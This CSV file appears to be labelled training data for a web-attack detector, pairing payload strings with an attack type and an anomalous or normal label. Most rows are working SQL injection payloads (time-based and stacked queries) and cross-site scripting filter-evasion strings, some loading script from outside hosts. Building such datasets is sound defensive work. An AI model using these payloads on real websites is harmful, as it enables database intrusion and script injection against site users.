payload,attack_type,label
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",sqli,anom
"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",sqli,anom
1')));select pg_sleep(5)--,sqli,anom
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",sqli,anom
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",sqli,anom
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,anom
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",xss,anom
"</textarea>'""><script>alert(xss)</script>",xss,anom
"'""""><script language=""javascript""> alert('x s s');</script>",xss,anom
</script></script><<<<script><>>>><<<script>alert(xss)</script>,xss,anom
<html><noalert><noscript>(xss)</noscript><script>(xss)</script>,xss,anom
'></select><script>alert(xss)</script>,xss,anom
nasir,norm,norm
rasel,norm,norm
killer,norm,norm
"<A/hREf=""j%0aavas%09cript%0a:%09con%0afirm%0d``"">z",,anom
"<d3""<""/onclick=""1>[confirm``]""<"">z",,anom
<d3/onmouseenter=[2].find(confirm)>z,,anom
<details open ontoggle=confirm()>,,anom
"<script y=""><"">/*<script* */prompt()</script",,anom
"<w=""/x=""y>""/ondblclick=`<`[confir\u006d``]>z",,anom
"<a href=""javascript%26colon;alert(1)"">click",,anom
<a href=javas&#99;ript:alert(1)>click,,anom
"<script/""<a""/src=data:="".<a,[8].some(confirm)>",,anom
"<svg/x="">""/onload=confirm()//",,anom
<--`<img/src=` onerror=confirm``> --!>,,anom
<svg%0Aonload=%09((pro\u006dpt))()//,,anom
<sCript x>(((confirm)))``</scRipt x>,,anom
"<svg </onload =""1> (_=prompt,_(1)) """">",,anom
<!--><script src=//14.rs>,,anom
<embed src=//14.rs>,,anom
"<script x="">"" src=//15.rs></script>",,anom
"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",,anom
<iframe/src \/\/onload = prompt(1),,anom
<x oncut=alert()>x,,anom
<svg onload=write()>,,anom
<body oninput=javascript:alert(1)><input autofocus>,,anom
"<math href=""javascript:javascript:alert(1)"">CLICKME</math> <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",,anom
<frameset onload=javascript:alert(1)>,,anom
"<table background=""javascript:javascript:alert(1)"">",,anom
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",,anom
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",,anom
"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",,anom
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",,anom
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",,anom
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",,anom
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,,anom
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",,anom
"<object data=""data:text/html;base64,%(base64)s"">",,anom
"<embed src=""data:text/html;base64,%(base64)s"">",,anom
<b <script>alert(1)</script>0,,anom
"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",,anom
"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",,anom
"<embed src=""javascript:alert(1)"">",,anom
"<img src=""javascript:alert(1)"">",,anom
"<image src=""javascript:alert(1)"">",,anom
"<script src=""javascript:alert(1)"">",,anom
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,,anom
"<? foo=""><script>javascript:alert(1)</script>"">",,anom
"<! foo=""><script>javascript:alert(1)</script>"">",,anom
"</ foo=""><script>javascript:alert(1)</script>"">",,anom
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",,anom
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",,anom
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",,anom
